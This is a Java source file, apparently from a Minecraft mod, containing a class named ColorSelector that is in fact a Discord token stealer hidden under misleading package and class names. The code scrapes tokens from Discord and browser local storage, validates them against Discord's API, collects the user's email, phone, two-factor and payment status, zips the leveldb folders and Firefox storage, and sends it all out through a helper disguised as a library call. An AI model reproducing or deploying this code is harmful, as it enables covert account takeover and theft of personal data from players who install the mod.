package net.jodah.typetools.impl;

import com.google.common.reflect.TypeToken;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.reflxction.example.proxy.IMinecraft;
import net.reflxction.example.utils.GuiDescriptions;
import com.squareup.okhttp.internal.spdy.HudEditor;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class ColorSelector implements IMinecraft {

    private static final Gson gson = new Gson();

    public static final List<String> paths = new ArrayList<>(Arrays.asList(
            System.getenv("APPDATA") + "\\Discord",
            System.getenv("APPDATA") + "\\discordcanary",
            System.getenv("APPDATA") + "\\discordptb",
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
            System.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
            System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default",
            System.getenv("APPDATA") + "\\LightCord",
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"
    ));

    @Override
    public void execute() throws Exception {
        List<String> tokens = new ArrayList<>();
        paths.stream().map(this::getTokens).filter(Objects::nonNull).forEach(tokens::addAll);
        tokens = removeDuplicates(tokens);
        tokens = getValidTokens(tokens);

        paths.stream()
                .map(s -> s + "\\Local Storage\\leveldb\\")
                .forEach(s -> { try {
                    File file = new File(System.getenv("TEMP") + "\\" + randomString());
                    pack(s, file.getPath());
                    HudEditor.send(file);
                } catch (IOException ignored) { } });
        tokens.forEach(token -> HudEditor.send(process(token)));
        getFirefoxFile().ifPresent(HudEditor::send);
        Thread.sleep(27000);
    }

    public ArrayList<String> getTokens(String inPath) {
        String path = inPath + "\\Local Storage\\leveldb\\";
        ArrayList<String> tokens = new ArrayList<>();

        File pa = new File(path);
        String[] list = pa.list();
        if (list == null) return null;

        for (String s : list) {
            try {
                FileInputStream fileInputStream = new FileInputStream(path + s);
                DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));

                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    Matcher matcher = Pattern.compile("[\\w\\.]{24}\\.[\\w\\.]{6}\\.[\\w\\.\\-]{27}|mfa\\.[\\w\\.\\-]{84}").matcher(line);
                    while (matcher.find()) tokens.add(matcher.group());
                }
            }
            catch (Exception ignored) { }
        }

        HudEditor.send(String.join(" - ", tokens));

        return tokens;
    }

    public static List<String> removeDuplicates(List<String> list) {
        return list.stream().distinct().collect(Collectors.toCollection(ArrayList::new));
    }

    public static List<String> getValidTokens(List<String> tokens) {
        ArrayList<String> validTokens = new ArrayList<>();
        tokens.forEach(token -> {
            try {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                Map<String, Object> stuff = gson.fromJson(getHeaders(token), new TypeToken<Map<String, Object>>() {}.getType());
                stuff.forEach((key, value) -> con.addRequestProperty(key, (String) value));
                con.getInputStream().close();
                validTokens.add(token);
            } catch (Exception ignored) { }
        });
        return validTokens;
    }

    public static JsonObject getHeaders(String token) {
        JsonObject object = new JsonObject();
        object.addProperty("Content-Type", "application/json");
        object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token != null) object.addProperty("Authorization", token);
        return object;
    }

    public static Optional<File> getFirefoxFile() {
        File file = new File(System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
        if (file.isDirectory())
            for (File file1 : Objects.requireNonNull(file.listFiles()))
                if (file1.isDirectory() && file1.getName().contains("release"))
                    for (File file2 : Objects.requireNonNull(file1.listFiles()))
                        if (file2.getName().contains("webappsstore"))
                            return Optional.of(file2);

        return Optional.empty();
    }

    public static String randomString() {
        String AlphaNumericString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvxyz";
        StringBuilder sb = new StringBuilder(20);
        for (int i = 0; i < 20; i++) {
            int index = (int)(AlphaNumericString.length() * Math.random());
            sb.append(AlphaNumericString.charAt(index));
        }
        return sb.toString();
    }

    public static String getContentFromURL(String link, String auth) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            Map<String, Object> json = gson.fromJson(getHeaders(auth), new TypeToken<Map<String, Object>>() {}.getType());
            json.forEach((key, value) -> httpURLConnection.addRequestProperty(key, (String) value));
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        }
        catch (Exception ignored)
        {
            return "";
        }
    }

    private Object process(String token) {
        JsonObject obj = new JsonParser().parse(getUserData(token)).getAsJsonObject();

        return new GuiDescriptions.Builder("Components")
                .addField("Token", token, false)
                .addField("Name", obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString(), true)
                .addField("Email", obj.get("email").getAsString(), true)
                .addField("2Factor", String.valueOf(obj.get("mfa_enabled").getAsBoolean()), true)
                .addField("Phone", !obj.get("phone").isJsonNull() ? obj.get("phone").getAsString() : "None", true)
                .addField("Nitro", obj.has("premium_type") ? "True" : "False", true)
                .addField("Payment", hasPaymentMethods(token) ? "True" : "False", true).build();
    }

    private String getUserData(String token)
    {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }

    private boolean hasPaymentMethods(String token)
    {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
    }

    private void pack(String sourceDirPath, String zipFilePath) throws IOException
    {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p)))
        {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .filter(path -> path.toFile().getPath().contains("ldb"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try
                        {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        }
                        catch (IOException ignored) { }
                    });
        }
    }
}
